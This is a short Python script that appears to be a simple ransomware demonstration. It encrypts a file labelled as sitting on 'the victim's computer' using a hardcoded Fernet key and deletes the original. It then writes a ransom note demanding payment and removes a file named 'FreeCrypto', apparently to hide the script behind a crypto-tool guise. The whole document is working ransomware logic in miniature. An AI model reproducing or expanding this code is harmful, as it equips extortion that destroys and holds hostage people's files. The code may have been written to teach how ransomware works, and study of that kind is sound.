from cryptography.fernet import Fernet
import os

# Symmetric encryption
# Add the generated key
key = "ueL6nKisgol82EfKedZ06ceMNwXATUQMJgRQvENfsXM="
fernet = Fernet(key)

# File path to be encrypted on the victim's computer
filepath = '../Important/sample.txt'
enc_filepath = '../Important/sample.encrypted.txt'
ransome_notice_filepath = '../Important/ransome_notice.txt'

# encrypt and remove the file 
with open(filepath,'rb') as f:
    target = f.read()
encrypted = fernet.encrypt(target)
os.remove(filepath)

with open(enc_filepath,'wb') as enc_f:
    enc_f.write(encrypted)

# Write a ransome notice
with open(ransome_notice_filepath,'w') as f:
    f.write("Your data has been encrypted!!\nPay $100M to acc no. 12345 for the decryption key\n\nYours Truly,\nHecker")

# Remove the encryption script
os.remove('./FreeCrypto')